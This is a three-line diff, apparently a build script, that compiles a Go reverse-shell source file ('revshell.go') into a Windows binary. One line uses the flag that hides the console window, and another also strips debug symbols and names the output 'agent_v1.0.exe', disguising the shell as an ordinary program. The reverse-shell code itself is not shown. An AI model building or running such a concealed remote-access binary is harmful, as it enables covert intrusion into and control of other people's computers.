@@ -1,0 +1,3 @@
+go env -w GO111MODULE=off
+go build -ldflags="-H=windowsgui" revshell.go
+go build -ldflags="-s -w -H=windowsgui" -o agent_v1.0.exe revshell.go
